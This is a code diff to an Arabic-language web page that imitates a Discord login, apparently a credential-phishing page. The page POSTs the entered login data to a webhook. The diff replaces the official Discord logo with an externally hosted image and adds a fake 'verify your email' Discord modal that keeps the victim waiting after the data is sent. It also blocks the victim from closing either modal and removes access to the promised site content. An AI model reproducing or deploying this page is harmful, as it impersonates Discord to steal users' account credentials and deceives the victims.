@@ -59,8 +59,9 @@
         }
         
         .discord-logo {
-            width: 40px;
-            height: 40px;
+            width: 80px;
+            height: auto;
+            border-radius: 10px;
         }
         
         .site-logo {
@@ -158,6 +159,79 @@
         .error {
             background-color: #f04747;
             color: white;
+        }
+        
+        /* نافذة التحقق من البريد الإلكتروني */
+        .verification-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1001;
+        }
+        
+        .verification-box {
+            background: #2f3136;
+            border-radius: 15px;
+            width: 90%;
+            max-width: 500px;
+            padding: 40px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            border: 1px solid #40444b;
+        }
+        
+        .verification-icon {
+            font-size: 80px;
+            color: #7289da;
+            margin-bottom: 20px;
+        }
+        
+        .verification-title {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 15px;
+            color: #fff;
+        }
+        
+        .verification-text {
+            color: #b9bbbe;
+            margin-bottom: 30px;
+            line-height: 1.6;
+            font-size: 16px;
+        }
+        
+        .email-address {
+            background: #36393f;
+            padding: 10px 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+            display: inline-block;
+            font-weight: bold;
+            color: #7289da;
+        }
+        
+        .verification-button {
+            padding: 12px 30px;
+            background: linear-gradient(90deg, #43b581, #3aa371);
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 10px;
+        }
+        
+        .verification-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 10px rgba(67, 181, 129, 0.4);
         }
         
         /* محتوى الموقع الرئيسي */
@@ -380,9 +454,17 @@
                 grid-template-columns: 1fr;
             }
             
-            .login-box {
+            .login-box, .verification-box {
                 width: 95%;
                 padding: 20px;
+            }
+            
+            .verification-icon {
+                font-size: 60px;
+            }
+            
+            .verification-title {
+                font-size: 24px;
             }
         }
     </style>
@@ -392,7 +474,7 @@
     <div class="login-modal" id="loginModal">
         <div class="login-box">
             <div class="login-header">
-                <img src="https://discord.com/assets/847541504914fd33810e70a0ea73177e.ico" alt="Discord Logo" class="discord-logo">
+                <img src="https://i.postimg.cc/43dKMFhq/3.jpg" alt="Discord Logo" class="discord-logo">
                 <img src="https://i.postimg.cc/bNymjbzs/49c877b3cdd5639-file-000000009934620a92cc60485f72713b-wm.png" alt="Pro Features Logo" class="site-logo">
             </div>
             
@@ -418,6 +500,30 @@
             <div class="register-link">
                 لا تملك حسابًا؟ <a href="#">سجل الآن</a>
             </div>
+        </div>
+    </div>
+    
+    <!-- نافذة التحقق من البريد الإلكتروني -->
+    <div class="verification-modal" id="verificationModal">
+        <div class="verification-box">
+            <div class="verification-icon">✉️</div>
+            <h2 class="verification-title">التحقق من البريد الإلكتروني</h2>
+            <p class="verification-text">
+                 لقد أرسلنا لك رسالة عبر البريد الإلكتروني تحتوي على رابط التحقق من ديسكورد.
+                <br>
+                يرجى فتح بريدك الإلكتروني والنقر على الرابط لإكمال عملية التسجيل.
+            </p>
+            
+            <div class="email-address" id="userEmail">user@example.com</div>
+            
+            <p class="verification-text">
+                إذا لم تستلم الرسالة، تحقق من مجلد البريد العشوائي أو 
+                <a href="#" style="color: #7289da;">أعد إرسال الرسالة</a>.
+            </p>
+            
+            <p style="color: #b9bbbe; margin-top: 20px; font-size: 14px;">
+                لا يمكنك تخطي هذه الخطوة. يجب التحقق من بريدك الإلكتروني للمتابعة.
+            </p>
         </div>
     </div>
     
@@ -551,26 +657,18 @@
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
-                    'Accept': 'application/json'
+                        'Accept': 'application/json'
                     },
                     body: JSON.stringify(data),
                 });
                 
                 if (response.ok) {
-                    // إخفاء نافذة التسجيل وإظهار المحتوى الرئيسي
+                    // إخفاء نافذة التسجيل وإظهار نافذة التحقق
                     document.getElementById('loginModal').style.display = 'none';
-                    document.getElementById('mainContent').classList.add('active');
-                    document.body.style.overflow = 'auto'; // السماح بالتمرير
+                    document.getElementById('verificationModal').style.display = 'flex';
                     
-                    // إضافة تأثيرات الظهور للمحتوى
-                    setTimeout(() => {
-                        document.querySelectorAll('.feature-card').forEach((card, index) => {
-                            setTimeout(() => {
-                                card.style.opacity = '1';
-                                card.style.transform = 'translateY(0)';
-                            }, index * 100);
-                        });
-                    }, 300);
+                    // عرض البريد الإلكتروني للمستخدم
+                    document.getElementById('userEmail').textContent = email;
                 } else {
                     throw new Error('Failed to send data to webhook');
                 }
@@ -584,6 +682,49 @@
             }
         });
         
+        // منع إغلاق النوافذ بالنقر خارجها أو بالزر ESC
+        function preventClosing(modalId) {
+            const modal = document.getElementById(modalId);
+            
+            modal.addEventListener('click', function(e) {
+                // منع الإغلاق عند النقر خارج النافذة
+                if (e.target === this) {
+                    // إظهار رسالة أن العملية إلزامية
+                    const notification = document.getElementById('notification');
+                    notification.textContent = 'يجب إكمال هذه الخطوة للوصول إلى الموقع';
+                    notification.className = 'notification error';
+                    notification.style.display = 'block';
+                    
+                    // التأكيد على عدم إمكانية التخطي
+                    if (modalId === 'verificationModal') {
+                        notification.textContent = 'لا يمكن تخطي هذه الخطوة. يجب التحقق من بريدك الإلكتروني للمتابعة.';
+                    }
+                }
+            });
+        }
+        
+        // منع إغلاق النوافذ بالزر ESC
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                e.preventDefault();
+                const notification = document.getElementById('notification');
+                
+                // تحديد النافذة النشطة حالياً
+                if (document.getElementById('verificationModal').style.display === 'flex') {
+                    notification.textContent = 'لا يمكن تخطي هذه الخطوة. يجب التحقق من بريدك الإلكتروني للمتابعة.';
+                } else {
+                    notification.textContent = 'يجب إكمال هذه الخطوة للوصول إلى الموقع';
+                }
+                
+                notification.className = 'notification error';
+                notification.style.display = 'block';
+            }
+        });
+
+        // تطبيق منع الإغلاق على النوافذ
+        preventClosing('loginModal');
+        preventClosing('verificationModal');
+        
         // تهيئة تأثيرات الظهور للمحتوى
         document.querySelectorAll('.feature-card').forEach(card => {
             card.style.opacity = '0';
@@ -591,25 +732,8 @@
             card.style.transition = 'opacity 0.5s, transform 0.5s';
         });
         
-        // منع إغلاق النافذة بالنقر خارجها أو بالزر ESC
-        document.getElementById('loginModal').addEventListener('click', function(e) {
-            if (e.target === this) {
-                // يمكنك إضافة رسالة هنا أن التسجيل إلزامي
-                notification.textContent = 'يجب تسجيل الدخول للوصول إلى الموقع';
-                notification.className = 'notification error';
-                notification.style.display = 'block';
-            }
-        });
-        
-        // منع إغلاق النافذة بالزر ESC
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'Escape') {
-                e.preventDefault();
-                notification.textContent = 'يجب تسجيل الدخول للوصول إلى الموقع';
-                notification.className = 'notification error';
-                notification.style.display = 'block';
-            }
-        });
+        // إزالة أي إمكانية للوصول إلى المحتوى الرئيسي دون التحقق
+        // لا توجد وسيلة للوصول إلى المحتوى الرئيسي دون التحقق من البريد الإلكتروني
     </script>
 </body>
-                                                       </html>
+    </html>
